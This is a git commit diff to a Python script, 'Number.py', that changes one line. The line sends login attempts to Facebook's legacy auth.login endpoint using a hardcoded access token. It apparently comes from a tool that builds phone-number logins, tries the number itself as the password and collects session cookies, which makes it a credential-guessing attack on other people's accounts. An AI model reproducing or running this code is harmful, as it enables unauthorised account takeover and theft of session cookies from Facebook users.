55e67d46ca8d558a6461a1fed1b6fcf528809ca0
Sohail-302 <92088209+Sohail-302@users.noreply.github.com>
2021-12-27 14:26:30 +0500

    Update Number.py

--- Number.py
+++ Number.py
@@ -264,7 +264,7 @@ def action():
 
             pass1 = user
 
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25258C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 
             q = json.load(data)
 
